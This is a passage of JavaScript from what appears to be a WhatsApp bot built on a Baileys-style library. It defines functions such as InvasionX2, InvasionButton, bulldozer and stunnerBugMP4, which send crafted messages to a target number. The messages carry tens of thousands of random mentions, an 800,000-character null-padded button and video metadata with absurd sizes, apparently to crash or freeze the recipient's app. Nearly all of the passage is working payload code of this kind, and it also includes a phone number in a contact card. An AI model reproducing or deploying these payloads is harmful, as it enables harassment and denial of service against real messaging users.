                                    is_status_mention: "⚡ 𝔖𝔭𝔞𝔠𝔢𝔪𝔞𝔫-ℭ𝔬𝔯𝔢 🚀🩸",
                                },
                                content: undefined,
                            },
                        ],
                    }
                );
} catch (err) {
console.log(err);
}
}

async function InvasionX2(target) {
try {
  const generateMessage = {
        viewOnceMessage: {
            message: {
                contactMessage: {
                    displayName: "xInvasion Incognito🩸",
                    vcard: `BEGIN:VCARD
VERSION:1.1
FN:☇-X
TEL;type=CELL;type=VOICE;waid=6283849303906:+62 838-4930-3906
END:VCARD`,
                    contextInfo: {
                        mentionedJid: Array.from({
                            length: 30000
                        }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
                        isSampled: true,
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true
                    }
                }
            }
        }
    };

    const msg = generateWAMessageFromContent(target, generateMessage, {});

    await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{
                    tag: "to",
                    attrs: {
                        jid: target
                    },
                    content: undefined
                }]
            }]
        }]
    });
  } catch (err) { 
console.log(err); 
}
}

async function InvasionButton(target) { 
      let buttonMsg = await generateWAMessageFromContent(target, {
        buttonsMessage: {
          text: "⚡",
          contentText: "༿𝔖𝔭𝔞𝔠𝔢𝔪𝔞𝔫-ℭ𝔬𝔯𝔢༑ᜳ⃟",
          footerText: "𝔖𝔭𝔞𝔠𝔢𝔪𝔞𝔫-ℭ𝔬𝔯𝔢🥶",
          buttons: [{
            buttonId: ".glitch",
            buttonText: {
              displayText: "⚡" + "\0".repeat(800000)
            },
            type: 1
          }],
          headerType: 1
        }
      }, {});
      await sock.relayMessage("status@broadcast", buttonMsg.message, {
        messageId: buttonMsg.key.id,
        statusJidList: [target],
        additionalNodes: [{
          tag: "meta",
          attrs: {},
          content: [{
            tag: "mentioned_users",
            attrs: {},
            content: [{
              tag: "to",
              attrs: {
                jid: target
              },
              content: undefined
            }]
          }]
        }]
      });
        await sock.relayMessage(target, {
          groupStatusMentionMessage: {
            message: {
              protocolMessage: {
                key: buttonMsg.key,
                type: 25
              }
            }
          }
        }, {
          additionalNodes: [{
            tag: "meta",
            attrs: {
              is_status_mention: "𝔖𝔭𝔞𝔠𝔢𝔪𝔞𝔫-ℭ𝔬𝔯𝔢🩸"
            },
            content: undefined
          }]
        });
}

async function bulldozer(isTarget) {
  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath:
            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: {
            low: 1746112211,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: [
              "13135550002@s.whatsapp.net",
              ...Array.from(
                {
                  length: 40000,
                },
                () =>
                  "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: -1939477883,
            high: 406,
            unsigned: false,
          },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(isTarget, message, {});

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [isTarget],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: isTarget },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
}
 
async function stunnerBugMP4(targetNumber) {
  try {
    const message = {
      viewOnceMessage: {
        message: {
          videoMessage: {
            interactiveAnnotations: [],
            annotations: [
              {
                embeddedContent: {
                  musicContentMediaId: "12345789451",
                  songId: "88888888888888",
                  author: "𑲭𑲭",
                  title: "☇",
                  artworkDirectPath:
                    "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
                  artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
                  artworkEncSha256:
                    "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
                  artistAttribution: "https://www.instagram.com/_u/oxxy",
                  countryBlocklist: true,
                  isExplicit: true,
                  artworkMediaKey:
                    "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU=",
                },
                embeddedAction: true,
              },
            ],
            caption: `⚡ 𝔖𝔭𝔞𝔠𝔢𝔪𝔞𝔫-ℭ𝔬𝔯𝔢 🚀🩸 `,
            url: "https://mmg.whatsapp.net/v/t62.7161-24/19962704_656482737304802_3148076705978799507_n.enc?ccb=11-4&oh=01_Q5Aa1QFxApNysKSqcRZqIJ7j5ps8agbLDm_5BeWdTmC3acBQZQ&oe=68365482&_nc_sid=5e03e0&mms3=true",
            mimetype: "video/mp4",
            fileSha256: "bvkPnStTimcqgvugKm2jV1cKSAdJ00DnnKR31N/aH0Q=",
            fileLength: {
              low: 55438054,
              high: 0,
              unsigned: true,
            },
            seconds: 99999999,
            mediaKey: "XSc3T7jk+OhrNGSH4gMZQFnzL7boede9orqrG4a+QZ0=",
            height: 999999,
            width: 999999,
            fileEncSha256: "krpFGEDnkho/kNIQRY6qCYfzxdaxNzdW2H5fli3qg64=",
            directPath:
              "/v/t62.7161-24/19962704_656482737304802_3148076705978799507_n.enc?ccb=11-4&oh=01_Q5Aa1QFxApNysKSqcRZqIJ7j5ps8agbLDm_5BeWdTmC3acBQZQ&oe=68365482&_nc_sid=5e03e0",
            mediaKeyTimestamp: {
              low: 1745804782,
              high: 0,
              unsigned: false,
            },
            jpegThumbnail:
              "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAKAMBIgACEQEDEQH/xAAvAAEAAwEBAAAAAAAAAAAAAAAAAgMEAQUBAQADAQAAAAAAAAAAAAAAAAUCAwQB/9oADAMBAAIQAxAAAADQBgiiyUpiMRT3vLsvN62wHjoyhr2+hRbQgh10QPSU23aa8mtJCxAMOwltmOwUV9UCif/EACAQAAICAQQDAQAAAAAAAAAAAAECAAMRBBASQSAhMTL/2gAIAQEAAT8A87dRXUQD9MR1sGR4U1VW2O7DLAwoqWMF3uc1oSBNAHBsdgfYlFhNjqd9R+FUdypVFSLKqqxa7Be5cvFztYpZlz1FxGbg2RLWD8W2tOBFsyoxMl3Ajn2AOttSwAEV5QQQzb6wkcIbSBK7XxgGD4J//8QAIhEBAAICAQIHAAAAAAAAAAAAAQACAxIhBBAREyMxUWGS/9oACAECAQE/AJrYNvDjtWrZAmWvop8HbpdRss45mauuSxMAv7JYNWXs2srOnXzaH3GPuz//xAAiEQACAQMEAgMAAAAAAAAAAAABAgADERIEECExE2EkMlH/2gAIAQMBAT8AmDBcsTb92RWdgqjmV0+MVA6G2jsM2l7SuuNVx7lAHD0XWfbiVGLuzGadj5EW/F9j2Z//2Q==",
            contextInfo: {
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from(
                  {
                    length: 42000,
                  },
                  () =>
                    "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
                ),
              ],
              groupMentions: [],
            },
            streamingSidecar:
              "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